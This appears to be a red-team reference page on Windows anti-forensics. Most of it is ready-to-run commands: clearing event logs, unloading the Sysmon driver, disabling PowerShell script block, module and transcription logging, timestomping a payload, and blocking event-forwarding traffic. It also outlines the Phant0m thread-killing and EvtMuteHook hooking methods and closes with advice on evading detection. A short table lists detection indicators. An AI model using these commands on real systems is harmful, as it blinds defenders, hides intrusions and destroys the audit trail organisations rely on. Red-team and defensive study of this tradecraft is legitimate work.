# Logging & Event Log Evasion

> **MITRE ATT&CK**: Defense Evasion > T1070.001 - Indicator Removal: Clear Windows Event Logs
> **Platforms**: Windows
> **Required Privileges**: Admin/SYSTEM
> **OPSEC Risk**: High

## Strategic Overview

Windows logging is the primary forensic evidence source for defenders. Security Event Logs, Sysmon, PowerShell logging, and centralized log forwarding (WEF/SIEM) create a comprehensive audit trail. For a Red Team Lead, tampering with logging is a calculated risk: clearing logs is itself detectable, but leaving them provides defenders a roadmap of your operation. The sophisticated approach is selective -- disrupt only the telemetry that matters while preserving baseline noise. The absence of logs is itself a high-fidelity alert in mature environments.

## Technical Deep-Dive

### Event Log Clearing (Blunt Approach)

```powershell
# Clear specific event logs (generates Event ID 1102 -- extremely obvious)
wevtutil cl Security
wevtutil cl System
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# PowerShell equivalent
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Security")
```

**Bad OPSEC**: Event ID 1102 is among the highest-fidelity SOC alerts and triggers immediate investigation.

### Selective Event Deletion (EvtMuteHook)

```
# EvtMuteHook: DLL injected into EventLog service (svchost.exe)
# Hooks EvtRender/EventWrite to filter specific events by ID, source, or content
# Example: suppress Event ID 4688 for cmd.exe/powershell.exe
#          suppress Event ID 4624 for specific accounts
#          all other events pass normally -- no log-cleared alert
```

### Event Log Service Thread Killing (Phant0m)

```powershell
# Phant0m: kill EventLog service threads without stopping the service
# 1. Find svchost.exe hosting EventLog
Get-WmiObject Win32_Service -Filter "Name='EventLog'" | Select ProcessId

# 2. Enumerate threads, identify those with start address in wevtsvc.dll
# 3. Suspend or terminate matching threads
# Service appears RUNNING (sc query) but silently drops all events

# Simplified C++ flow:
# OpenProcess(pid) -> NtQueryInformationThread(each thread) ->
# Compare thread start address against wevtsvc.dll range ->
# TerminateThread/SuspendThread for matches
```

### Sysmon Evasion

```powershell
# Identify Sysmon presence and driver name
Get-Service sysmon* 2>$null
fltMC.exe                              # List minifilter drivers (Sysmon at altitude 385201)
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f "sysmon" 2>nul

# Unload Sysmon driver (requires admin)
fltMC.exe unload SysmonDrv             # Or renamed driver name

# Exploit config blind spots (common gaps):
# - ProcessAccess events may exclude LSASS
# - DNS Query logging (Event 22) often disabled
# - Pipe events (17/18) and WMI events (19/20/21) frequently excluded
```

### PowerShell Logging Bypass

```powershell
# Disable Script Block Logging (Event ID 4104)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name "EnableScriptBlockLogging" -Value 0

# In-memory bypass: clear suspicious content signatures
$field = [System.Management.Automation.ScriptBlock].GetField(
    'signatures', [System.Reflection.BindingFlags]'NonPublic,Static')
$field.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[String]'))

# Disable Module Logging (Event ID 4103)
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
    -Name "EnableModuleLogging" -ErrorAction SilentlyContinue

# Disable Transcription
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -Name "EnableTranscripting" -Value 0
```

### Timestamp Manipulation

```powershell
# Modify file timestamps to blend with legitimate system files
$file = Get-Item "C:\path\to\payload.exe"
$ref = Get-Item "C:\Windows\System32\notepad.exe"
$file.CreationTime = $ref.CreationTime
$file.LastWriteTime = $ref.LastWriteTime
$file.LastAccessTime = $ref.LastAccessTime
```

### Log Forwarding Disruption

```powershell
# Block WEF (Windows Event Forwarding) traffic
netsh advfirewall firewall add rule name="BlockWEF" dir=out protocol=tcp remoteport=5985,5986 action=block
# Block syslog forwarding
netsh advfirewall firewall add rule name="BlockSyslog" dir=out protocol=udp remoteport=514 action=block
# Disable WinRM (breaks WEF)
Stop-Service WinRM; Set-Service WinRM -StartupType Disabled
```

## Detection & Evasion

| Indicator | Source | Notes |
|-----------|--------|-------|
| Event ID 1102 | Security Log | Audit log was cleared |
| Event ID 104 | System Log | Event log was cleared |
| Gaps in sequential Event IDs | SIEM correlation | Missing events indicate tampering |
| Sysmon service stopping | Event ID 4/1 | Service state change |
| fltMC.exe execution | Process creation logs | Minifilter manipulation |
| Registry changes to logging keys | Sysmon Event ID 13 | Logging policy modifications |
| EventLog thread termination | EDR thread monitoring | Phant0m detection |

**Evasion Guidance**: Prefer selective suppression over clearing. Disable logging before acting, not after. Account for real-time log forwarding to SIEM (local tampering is insufficient if forwarding is active). Restore logging after operations. Time actions during high-volume periods when gaps are less noticeable.

## Cross-References

- [ETW Evasion](etw-evasion.md) -- ETW feeds the Event Log service; disabling ETW stops logging at source
- [AV/EDR Evasion](av-edr-evasion.md) -- EDR has independent telemetry beyond Windows logging
- [Network Evasion](network-evasion.md) -- log forwarding disruption involves network techniques
- [AMSI Bypass](amsi-bypass.md) -- Script Block Logging captures AMSI bypass attempts

## References

- Phant0m: https://github.com/hlldz/Phant0m
- EvtMuteHook: https://github.com/bats3c/EvtMute
- Sysmon config: https://github.com/SwiftOnSecurity/sysmon-config
- PowerShell logging: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging
